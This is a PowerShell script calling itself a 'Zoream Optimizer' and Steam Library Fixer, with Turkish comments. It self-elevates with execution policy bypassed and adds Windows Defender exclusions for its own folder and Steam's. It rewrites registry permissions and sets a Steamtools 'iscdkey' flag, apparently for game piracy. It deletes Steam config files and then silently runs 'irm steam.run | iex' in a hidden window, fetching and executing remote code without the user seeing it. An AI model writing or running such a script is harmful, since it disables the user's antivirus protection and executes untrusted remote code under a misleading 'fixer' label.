Try {
    $MethodDefinition = @'
    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
    [DllImport("kernel32.dll")]
    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetStdHandle(int nStdHandle);
'@
    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru
} catch {}

function Disable-QuickEdit {
    $hInput = $Kernel32::GetStdHandle(-10) 
    $mode = 0
    if ($Kernel32::GetConsoleMode($hInput, [ref]$mode)) {
        $mode = $mode -band -not (0x0040 -bor 0x0020)
        $Kernel32::SetConsoleMode($hInput, $mode -bor 0x0080)
    }
}

Disable-QuickEdit
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "White"
$host.UI.RawUI.WindowTitle = "Zoream Optimizer | SYS_0xA7"
Clear-Host

$identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin   = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "`n [!] Requesting Administrative Privileges..." -ForegroundColor Yellow
    if ($PSCommandPath) { $scriptPath = $PSCommandPath } else {
        $scriptPath = Join-Path $env:TEMP "zoream_fix.ps1"
        $scriptText = $MyInvocation.MyCommand.ScriptBlock.ToString()
        Set-Content -Path $scriptPath -Value $scriptText -Encoding UTF8
    }
    Start-Process -FilePath "conhost.exe" -Verb RunAs -ArgumentList "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    exit
}

Disable-QuickEdit

function Show-Header {
    Write-Host " "
    Write-Host "   ███████╗ ██████╗ ██████╗ ███████╗ █████╗ ███╗   ███╗" -ForegroundColor Cyan
    Write-Host "   ╚══███╔╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗████╗ ████║" -ForegroundColor Cyan
    Write-Host "     ███╔╝ ██║   ██║██████╔╝█████╗  ███████║██╔████╔██║" -ForegroundColor DarkCyan
    Write-Host "    ███╔╝  ██║   ██║██╔══██╗██╔══╝  ██╔══██║██║╚██╔╝██║" -ForegroundColor Blue
    Write-Host "   ███████╗╚██████╔╝██║  ██║███████╗██║  ██║██║ ╚═╝ ██║" -ForegroundColor Blue
    Write-Host "   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝" -ForegroundColor DarkBlue
    Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "          Steam Library Fixer BY SYS_0xA7 " -ForegroundColor White
    Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host " "
}

function Write-Log {
    param([string]$Message, [string]$Type = "INFO")
    $Time = Get-Date -Format "HH:mm:ss"
    switch ($Type) {
        "INFO"    { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [?] $Message" -ForegroundColor Gray }
        "SUCCESS" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [OK] $Message" -ForegroundColor Green }
        "WARN"    { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [!] $Message" -ForegroundColor Yellow }
        "ERROR"   { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [X] $Message" -ForegroundColor Red }
        "STEP"    { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [>] $Message" -ForegroundColor Cyan }
    }
}

Clear-Host
Show-Header
Write-Log "Anti-Freeze (QuickEdit Disabled) applied successfully." "SUCCESS"

# Find Steam
try { $steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam").InstallPath } catch { $steamPath = $null }
if (-not $steamPath) { Write-Log "Steam not found!" "ERROR"; exit 1 }

$zoreamPath = Join-Path $env:LOCALAPPDATA "Zoream"
$zoreamExe = Join-Path $zoreamPath "Zoream.exe"

# -------------------------------------------------------------------------
# ZOREAM CHECK & DOWNLOAD MODULE
# -------------------------------------------------------------------------
if (-not (Test-Path $zoreamExe)) {
    Write-Log "Zoream component missing. Initiating download..." "WARN"
    
    $downloadUrl = "https://github.com/WolfGames156/zoreamrelease/releases/download/release/Zoream_Setup.exe"
    $tempSetup = Join-Path $env:TEMP "Zoream_Setup.exe"

    try {
        # .NET WebRequest kullanarak Timeout kontrolü ve Progress Bar
        $request = [System.Net.WebRequest]::Create($downloadUrl)
        $request.Timeout = 5000 # 5 Saniye Timeout
        $response = $request.GetResponse()
        
        $totalLength = $response.ContentLength
        $responseStream = $response.GetResponseStream()
        $targetStream = [System.IO.File]::Create($tempSetup)
        $buffer = New-Object byte[] 10KB
        $readCount = 0

        do {
            $count = $responseStream.Read($buffer, 0, $buffer.Length)
            $targetStream.Write($buffer, 0, $count)
            $readCount += $count
            if ($totalLength -gt 0) {
                $pct = [Math]::Floor(($readCount / $totalLength) * 100)
                Write-Progress -Activity "Downloading Zoream Installer" -Status "Progress: $pct%" -PercentComplete $pct
            }
        } while ($count -gt 0)

        $targetStream.Close()
        $responseStream.Close()
        $response.Close()
        
        Write-Progress -Activity "Downloading Zoream Installer" -Completed
        Write-Log "Zoream Setup downloaded successfully." "SUCCESS"
        
        # Ayrı bir işlem olarak aç (PowerShell'i bekletmesin)
        Start-Process -FilePath $tempSetup -WindowStyle Normal
    }
    catch {
        # Hata olursa veya 5 saniye timeout yerse hiçbir şey yapma, devam et.
        # İleride hata yazdırmıyoruz.
    }
}
# -------------------------------------------------------------------------

Write-Log "Applying Windows Defender exclusion for Zoream folder..." "STEP"

if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    try {
        # Klasör fiziksel olarak oluşmamış olsa bile exclusion eklemek mantıklıdır (kurulum öncesi)
        # Ancak orijinal kodda Test-Path kontrolü vardı, burada hata almamak için
        # Eğer kurulum yeni indiyse klasör henüz oluşmamış olabilir.
        if (-not (Test-Path $zoreamPath)) {
            New-Item -ItemType Directory -Path $zoreamPath -Force | Out-Null
        }

        $existing = (Get-MpPreference -ErrorAction Stop).ExclusionPath

        if ($existing -and $existing -contains $zoreamPath) {
            Write-Log "Zoream folder already excluded." "SUCCESS"
        }
        else {
            Add-MpPreference -ExclusionPath $zoreamPath -ErrorAction Stop
            Write-Log "Zoream folder excluded successfully." "SUCCESS"
        }
    }
    catch {
        Write-Log "Failed to apply Defender exclusion. (If it does not apply automatically, you may add it manually.)" "ERROR"
    }
}
else {
    Write-Log "Windows Defender cmdlets not available. (If it does not apply automatically, you may add it manually.)" "ERROR"
}

Write-Log "Applying Windows Defender exclusion for Steam Folder..." "STEP"

if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    try {
        $existing = (Get-MpPreference -ErrorAction Stop).ExclusionPath

        if ($existing -and $existing -contains $steamPath) {
            Write-Log "Steam folder already excluded." "SUCCESS"
        }
        else {
            Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
            Write-Log "Steam folder excluded successfully." "SUCCESS"
        }
    }
    catch {
        Write-Log "Failed to apply Defender exclusion. (If it does not apply automatically, you may add it manually.)" "ERROR"
    }
}
else {
    Write-Log "Failed to apply Defender exclusion. (If it does not apply automatically, you may add it manually.)" "ERROR"
}


# -------------------------------------------------------------------------
# REGISTRY FIX: VALVE\STEAMTOOLS (DEVRALMAYI KALDIRAN KOD)
# -------------------------------------------------------------------------
Write-Log "Configuring Registry: Valve\Steamtools..." "STEP"
$regPath = "HKLM:\Software\Valve\Steamtools"

try {
    # 1. Anahtar yoksa oluştur, varsa al
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
        Write-Log "Registry key created." "INFO"
    }

    # 2. Mevcut ACL'yi al
    $acl = Get-Acl -Path $regPath

    # =========================================================================
    # KRİTİK NOKTA: DEVRALMAYI (INHERITANCE) KAPAT VE TEMİZLE
    # İlk parametre ($true): Devralmayı engelle (Block Inheritance)
    # İkinci parametre ($false): Mevcut devralınmış kuralları SİL (Remove).
    # Bu işlem, yukarıdan gelen engellemeleri tamamen kaldırır.
    # =========================================================================
    $acl.SetAccessRuleProtection($true, $false)

    # 3. Yöneticiler Grubuna TAM YETKİ Tanımla
    $adminAccount = New-Object System.Security.Principal.NTAccount("Administrators")
    $adminRule = New-Object System.Security.AccessControl.RegistryAccessRule(
        $adminAccount,
        "FullControl",
        "ContainerInherit,ObjectInherit",
        "None",
        "Allow"
    )

    # 4. Mevcut Kullanıcıya TAM YETKİ Tanımla
    $currentUser = [System.Security.Principal.NTAccount]("$env:USERDOMAIN\$env:USERNAME")
    $userRule = New-Object System.Security.AccessControl.RegistryAccessRule(
        $currentUser,
        "FullControl",
        "ContainerInherit,ObjectInherit",
        "None",
        "Allow"
    )

    # 5. Kuralları Uygula (Önce listeyi temizlemiş olduğumuz için çakışma olmaz)
    $acl.SetOwner($adminAccount)  # Sahipliği Administrator yap
    $acl.AddAccessRule($adminRule) # Admin yetkisini ekle
    $acl.AddAccessRule($userRule)  # Kullanıcı yetkisini ekle

    # 6. İzinleri Kayıt Defterine İşle
    Set-Acl -Path $regPath -AclObject $acl
    Write-Log "Permissions reset: Inheritance removed & FullControl granted." "SUCCESS"

    # 7. Değeri Zorla Yaz (Force)
    New-ItemProperty -Path $regPath -Name "iscdkey" -Value "true" -PropertyType String -Force | Out-Null
    
    # Sağlama Yap
    $check = Get-ItemProperty -Path $regPath -Name "iscdkey" -ErrorAction SilentlyContinue
    if ($check.iscdkey -eq "true") {
        Write-Log "Registry value 'iscdkey' confirmed as 'true'." "SUCCESS"
    } else {
        Write-Log "Registry write verification failed." "ERROR"
    }

} catch {
    Write-Log "Registry Fix Error: $_" "ERROR"
}
# -------------------------------------------------------------------------


Write-Log "Clearing Beta & Killing Processes..." "STEP"
Start-Process (Join-Path $steamPath "Steam.exe") -ArgumentList "-clearbeta"
Start-Sleep -Seconds 5
Get-Process steam* -ErrorAction SilentlyContinue | Stop-Process -Force

$backupPath = Join-Path $steamPath "cache-backup"
New-Item -ItemType Directory -Path $backupPath -Force | Out-Null

if (Test-Path (Join-Path $steamPath "appcache")) {
    Write-Log "Cleaning AppCache..." "STEP"
    Move-Item (Join-Path $steamPath "appcache") (Join-Path $backupPath "appcache") -Force -ErrorAction SilentlyContinue
}

$userdataPath = Join-Path $steamPath "userdata"
if (Test-Path $userdataPath) {
    Write-Log "Optimizing user data..." "STEP"
    foreach ($user in Get-ChildItem $userdataPath -Directory) {
        $config = Join-Path $user.FullName "config"
        if (Test-Path $config) {
            $uBack = Join-Path $backupPath ("userdata\" + $user.Name)
            New-Item -ItemType Directory -Path $uBack -Force | Out-Null
            Move-Item $config $uBack -Force -ErrorAction SilentlyContinue
            New-Item -ItemType Directory -Path $config -Force | Out-Null
            if (Test-Path (Join-Path $uBack "config\localconfig.vdf")) {
                Copy-Item (Join-Path $uBack "config\localconfig.vdf") (Join-Path $config "localconfig.vdf") -Force
            }
        }
    }
}

Write-Log "Validating and Cleaning stplug-in folder..." "STEP"
$stpluginPath = Join-Path $steamPath "config\stplug-in"

if (-not (Test-Path $stpluginPath)) {
    Write-Log "stplug-in folder does not exist!" "WARN"
}
else {

    Get-ChildItem $stpluginPath -File | ForEach-Object {

        if ($_.Extension -notin @(".lua", ".zor")) {
            Write-Log "Removing invalid file type: $($_.Name)" "ERROR"
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
        }
    }

    function Test-ValidLuaLine {
        param([string]$Line)

        $trimmed = $Line.Trim()

        if ([string]::IsNullOrWhiteSpace($trimmed)) { return $true }
        if ($trimmed.StartsWith('-')) { return $true }

        if ($trimmed -match '^(?i)(addappid|setManifestid|addtoken)') {
            if ($trimmed -match '\(' -and $trimmed -match '\)') {
                return $true
            }
        }

        return $false
    }

    Get-ChildItem $stpluginPath -File | Where-Object {
        $_.Extension -in @(".lua", ".zor")
    } | ForEach-Object {

        $lines = Get-Content $_.FullName
        $isClean = $true

        foreach ($l in $lines) {
            if (-not (Test-ValidLuaLine $l)) {
                $isClean = $false
                break
            }
        }

        if ($isClean) {
            Write-Log "Validated: $($_.Name)" "SUCCESS"
        }
        else {
            Write-Log "Invalid content detected! Deleting: $($_.Name)" "ERROR"
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
        }
    }
}

Write-Log "Checking for steam.cfg..." "STEP"
$cfgFiles = @("steam.cfg", "Steam.cfg")
foreach ($cfg in $cfgFiles) {
    $targetCfg = Join-Path $steamPath $cfg
    if (Test-Path $targetCfg) {
        Remove-Item $targetCfg -Force -ErrorAction SilentlyContinue
        Write-Log "Deleted: $cfg" "SUCCESS"
    }
}

Write-Log "Fix & Cleanup complete." "SUCCESS"
Write-Host " "
Write-Host "   >>> CORE EXECUTING IN BACKGROUND <<<" -ForegroundColor Cyan
Write-Host " "

$command = "irm steam.run | iex"
Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -WindowStyle Hidden

for ($i = 10; $i -gt 0; $i--) {
    Write-Host "`r   >>> This window will close in $i second(s) <<<  " -ForegroundColor Magenta -NoNewline
    Start-Sleep -Seconds 1
}

exit
